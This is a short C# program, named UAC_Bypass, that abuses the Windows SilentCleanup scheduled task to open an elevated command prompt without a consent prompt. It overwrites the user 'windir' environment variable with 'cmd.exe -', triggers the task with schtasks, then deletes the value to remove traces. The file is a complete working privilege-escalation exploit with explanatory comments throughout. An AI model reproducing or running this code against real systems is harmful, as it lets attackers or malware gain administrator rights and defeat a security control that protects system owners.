using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;

namespace UAC_Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            // allows us access to the user environment variable table, and changes the windir key (typically C:\Windows) to command prompt, with an added - to cancel any directories (ex: %windir%\System32)
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Environment");
            key.SetValue("windir", @"cmd.exe -"); // this replicates just fine because Windows doesn't check if user environment variables conflict with system environment variables

            Thread.Sleep(500);

            // since the silent disk cleanup task automatically has UAC priveleges, when the task scheduler accesses %windir% in any way using said task, it'll open command prompt with elevated UAC priveleges
            Process process = new Process();
            process.StartInfo.FileName = "schtasks.exe"; 
            process.StartInfo.Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"; // just performs what is normally a silent disk cleanup
            process.Start();

            Thread.Sleep(500);

            // deletes user-defined windir environment 
            key.DeleteValue("windir");
            key.Close();
            Environment.Exit(0);
        }
    }
}
